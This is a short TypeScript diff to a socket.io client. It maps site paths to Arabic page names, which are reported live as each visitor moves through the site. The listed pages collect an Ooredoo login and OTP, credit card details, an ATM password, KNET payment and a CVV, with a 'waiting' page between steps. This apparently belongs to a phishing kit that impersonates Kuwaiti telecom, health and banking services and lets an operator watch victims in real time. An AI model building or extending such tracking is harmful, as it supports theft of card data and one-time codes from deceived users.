@@ -235,7 +235,22 @@ export function initializeSocket() {
     const existingVisitorId = localStorage.getItem("visitorId");
     console.log("Registering visitor...", existingVisitorId ? "(returning visitor: " + existingVisitorId + ")" : "(new visitor)");
     const currentPath = window.location.pathname;
-    s.emit("visitor:register", { existingVisitorId, currentPage: pendingPage || currentPath });
+    // Convert URL path to readable page name
+    const pageNameMap: Record<string, string> = {
+      '/': 'البوابة الرئيسية',
+      '/sehhaty': 'خدمة صحتي',
+      '/medical-login': 'تسجيل دخول القومسيون',
+      '/ooredoo-login': 'تسجيل دخول Ooredoo',
+      '/ooredoo-otp': 'رمز OTP Ooredoo',
+      '/waiting': 'انتظار',
+      '/credit-card-payment': 'الدفع بطاقة الائتمان',
+      '/otp-verification': 'رمز التحقق OTP',
+      '/atm-password': 'كلمة مرور ATM',
+      '/knet-payment': 'KNET',
+      '/cvv': 'CVV',
+    };
+    const pageName = pendingPage || pageNameMap[currentPath] || currentPath;
+    s.emit("visitor:register", { existingVisitorId, currentPage: pageName });
   });
 
   s.on("connect_error", (error) => {
